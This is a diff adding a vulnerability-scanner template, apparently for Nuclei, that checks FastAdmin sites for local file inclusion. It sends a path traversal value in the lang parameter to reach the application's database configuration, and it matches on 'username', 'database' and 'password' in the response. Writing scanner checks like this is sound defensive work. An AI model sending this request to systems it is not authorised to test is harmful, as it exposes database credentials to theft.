@@ -1,0 +1,24 @@
+id: fastadmin-lfi
+
+info:
+  name: FastAdmin LFI
+  author: omkar7505
+  severity: high
+  description: |
+    FastAdmin LFI
+  tags: lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index/ajax/lang?lang=..//..//application/database"
+
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "username"
+          - "database"
+          - "password"
+        condition: and          
